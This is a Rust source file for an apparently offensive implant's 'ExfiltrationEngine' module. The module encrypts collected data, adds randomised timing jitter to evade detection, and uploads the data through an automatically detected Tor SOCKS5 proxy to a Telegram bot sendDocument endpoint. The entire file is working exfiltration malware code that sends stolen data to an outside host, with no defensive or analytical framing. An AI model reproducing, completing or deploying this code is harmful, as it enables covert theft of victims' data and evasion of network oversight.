// Windows version - same as Linux version
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time::{sleep, Instant};
use reqwest::Client;
use zeroize::Zeroize;
use std::env;

use crate::crypto::CryptoManager;

fn get_bot_token() -> String {
    env::var("PROTOSYTE_BOT_TOKEN")
        .unwrap_or_else(|_| obfuscated_token())
}

fn obfuscated_token() -> String {
    String::new()
}

fn get_bot_endpoint() -> String {
    let token = get_bot_token();
    if token.is_empty() {
        return String::new();
    }
    format!("https://api.telegram.org/bot{}/sendDocument", token)
}

pub struct ExfiltrationEngine {
    crypto: Arc<CryptoManager>,
    data_rx: mpsc::UnboundedReceiver<Vec<u8>>,
    interval: Duration,
    jitter: f32,
}

impl ExfiltrationEngine {
    pub fn new(crypto: Arc<CryptoManager>, data_rx: mpsc::UnboundedReceiver<Vec<u8>>) -> Self {
        Self {
            crypto,
            data_rx,
            interval: Duration::from_secs(347),
            jitter: 0.25,
        }
    }
    
    pub async fn start(mut self) {
        // Automatically detect Tor port
        use crate::tor_detection::TorManager;
        let proxy_url = TorManager::detect_tor_port();
        
        // Ensure Tor is running
        if let Err(e) = TorManager::ensure_tor_running() {
            eprintln!("[EXFIL] Tor warning: {}", e);
        }
        
        let proxy = reqwest::Proxy::all(&proxy_url)
            .unwrap_or_else(|_| panic!("Failed to create SOCKS5 proxy at {}", proxy_url));
        
        let client = match Client::builder()
            .proxy(proxy)
            .timeout(Duration::from_secs(30))
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[EXFIL] Failed to create HTTP client: {}", e);
                return;
            }
        };
        
        let bot_token = get_bot_token();
        if bot_token.is_empty() {
            eprintln!("[EXFIL] Bot token not configured");
            return;
        }
        
        let mut last_send = Instant::now();
        
        loop {
            tokio::select! {
                data = self.data_rx.recv() => {
                    match data {
                        Some(raw_data) => {
                            let encrypted = self.crypto.encrypt(&raw_data).await;
                            
                            let jitter_duration = self.calculate_jitter();
                            if last_send.elapsed() < self.interval + jitter_duration {
                                sleep(self.interval + jitter_duration - last_send.elapsed()).await;
                            }
                            
                            if let Err(e) = self.send_payload(&client, &encrypted).await {
                                eprintln!("[EXFIL] Failed to send payload: {}", e);
                            } else {
                                last_send = Instant::now();
                            }
                        }
                        None => break,
                    }
                }
            }
        }
    }
    
    fn calculate_jitter(&self) -> Duration {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let jitter_amount = rng.gen_range(-self.jitter..=self.jitter);
        let jitter_secs = (self.interval.as_secs_f32() * jitter_amount) as u64;
        Duration::from_secs(jitter_secs)
    }
    
    async fn send_payload(&self, client: &Client, payload: &[u8]) -> Result<(), String> {
        let endpoint = get_bot_endpoint();
        if endpoint.is_empty() {
            return Err("Bot endpoint not configured".to_string());
        }
        
        let form = reqwest::multipart::Form::new()
            .part("document", reqwest::multipart::Part::bytes(payload.to_vec())
                .file_name("data.bin")
                .mime_str("application/octet-stream")
                .map_err(|e| format!("Failed to create part: {}", e))?);
        
        let response = client
            .post(&endpoint)
            .multipart(form)
            .send()
            .await
            .map_err(|e| format!("Request failed: {}", e))?;
        
        if response.status().is_success() {
            Ok(())
        } else {
            Err(format!("HTTP error: {}", response.status()))
        }
    }
}

